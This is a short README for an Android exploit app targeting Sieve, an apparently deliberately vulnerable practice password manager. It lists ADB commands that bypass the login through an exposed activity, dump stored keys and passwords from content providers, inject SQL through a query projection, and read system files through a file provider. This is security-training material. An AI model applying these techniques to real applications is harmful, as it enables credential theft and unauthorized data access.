# sieve_pwn_max
 - an app which exploits several vulnerabilities in [sieve.apk](https://github.com/VAnD4L/sieve_pwn_max/releases/download/untagged-a80161bbd8e025d1211b/sieve.apk)

## how to invoke each function via ADB : 

### [func1](https://github.com/VAnD4L/sieve_pwn_max/blob/b875982477a9c9d52a3b1dc6f2ad4c9bddd26454/app/src/main/java/com/citadel/sieve_pwn_max/MainActivity.java#L38C1-L43C6) 

```
adb shell am start -n com.mwr.example.sieve/com.mwr.example.sieve.PWList

```

### [func2](https://github.com/VAnD4L/sieve_pwn_max/blob/b875982477a9c9d52a3b1dc6f2ad4c9bddd26454/app/src/main/java/com/citadel/sieve_pwn_max/MainActivity.java#L44C1-L50C6) 

```
adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
```

### [func3](https://github.com/VAnD4L/sieve_pwn_max/blob/b875982477a9c9d52a3b1dc6f2ad4c9bddd26454/app/src/main/java/com/citadel/sieve_pwn_max/MainActivity.java#L51C1-L57C6)

```
adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

### [func4](https://github.com/VAnD4L/sieve_pwn_max/blob/b875982477a9c9d52a3b1dc6f2ad4c9bddd26454/app/src/main/java/com/citadel/sieve_pwn_max/MainActivity.java#L58C1-L65C6)

```
adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection '* FROM Passwords;'
```

### [func5](https://github.com/VAnD4L/sieve_pwn_max/blob/b875982477a9c9d52a3b1dc6f2ad4c9bddd26454/app/src/main/java/com/citadel/sieve_pwn_max/MainActivity.java#L66C1-L81C6)

```
adb shell cat /data/data/com.mwr.example.sieve.FileBackupProvider/files/etc/hosts
```

